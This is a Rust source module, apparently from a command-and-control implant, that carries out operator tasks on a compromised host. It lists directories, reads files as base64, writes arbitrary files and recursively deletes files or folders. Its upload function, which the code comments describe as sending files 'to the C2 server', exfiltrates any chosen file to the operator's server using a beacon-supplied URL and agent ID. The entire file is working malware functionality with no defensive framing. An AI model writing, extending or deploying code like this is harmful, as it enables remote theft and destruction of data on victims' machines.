/// Storage: file system operations — list, read, write, delete, upload.

use super::TaskResult;
use crate::utils::helpers;
use serde_json::json;
use std::fs;
use std::path::Path;

pub fn list_dir(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };

    match fs::read_dir(path) {
        Ok(entries) => {
            let mut items = Vec::new();
            for entry in entries.flatten() {
                let meta = entry.metadata();
                let name = entry.file_name().to_string_lossy().to_string();
                let (size, is_dir, modified) = match meta {
                    Ok(m) => (
                        m.len(),
                        m.is_dir(),
                        m.modified()
                            .map(|t| {
                                t.duration_since(std::time::UNIX_EPOCH)
                                    .unwrap_or_default()
                                    .as_secs() as i64
                            })
                            .unwrap_or(0),
                    ),
                    Err(_) => (0, false, 0),
                };
                items.push(json!({
                    "name": name,
                    "size": size,
                    "is_dir": is_dir,
                    "modified": modified,
                }));
            }
            TaskResult::success(task_id, serde_json::to_string(&items).unwrap_or_default())
        }
        Err(e) => TaskResult::error(task_id, format!("list dir: {}", e)),
    }
}

pub fn read_file(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };

    match fs::read(path) {
        Ok(data) => {
            let encoded = helpers::b64_encode(&data);
            TaskResult::success_typed(task_id, encoded, "base64")
        }
        Err(e) => TaskResult::error(task_id, format!("read file: {}", e)),
    }
}

pub fn write_file(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };
    let content_b64 = match args.get("content").and_then(|v| v.as_str()) {
        Some(c) => c,
        None => return TaskResult::error(task_id, "missing 'content' argument".to_string()),
    };

    match helpers::b64_decode(content_b64) {
        Ok(data) => match fs::write(path, &data) {
            Ok(_) => TaskResult::success(task_id, format!("written {} bytes to {}", data.len(), path)),
            Err(e) => TaskResult::error(task_id, format!("write file: {}", e)),
        },
        Err(e) => TaskResult::error(task_id, format!("decode content: {}", e)),
    }
}

pub fn delete_file(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };

    let p = Path::new(path);
    let result = if p.is_dir() {
        fs::remove_dir_all(path)
    } else {
        fs::remove_file(path)
    };

    match result {
        Ok(_) => TaskResult::success(task_id, format!("deleted: {}", path)),
        Err(e) => TaskResult::error(task_id, format!("delete: {}", e)),
    }
}

/// Upload a file to the C2 server via HTTP multipart.
/// This needs access to config — we pass server_url and agent_id via args from the beacon.
pub fn upload_file_task(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let path = match args.get("path").and_then(|v| v.as_str()) {
        Some(p) => p,
        None => return TaskResult::error(task_id, "missing 'path' argument".to_string()),
    };
    let server_url = match args.get("_server_url").and_then(|v| v.as_str()) {
        Some(u) => u,
        None => return TaskResult::error(task_id, "missing server context".to_string()),
    };
    let agent_id = match args.get("_agent_id").and_then(|v| v.as_str()) {
        Some(id) => id,
        None => return TaskResult::error(task_id, "missing agent context".to_string()),
    };

    match fs::read(path) {
        Ok(data) => {
            let filename = Path::new(path)
                .file_name()
                .map(|f| f.to_string_lossy().to_string())
                .unwrap_or_else(|| "file".to_string());

            match crate::transport::https::upload_file(server_url, agent_id, path, &data, &filename) {
                Ok(_) => TaskResult::success(task_id, format!("uploaded: {} ({} bytes)", path, data.len())),
                Err(e) => TaskResult::error(task_id, format!("upload: {}", e)),
            }
        }
        Err(e) => TaskResult::error(task_id, format!("read file for upload: {}", e)),
    }
}
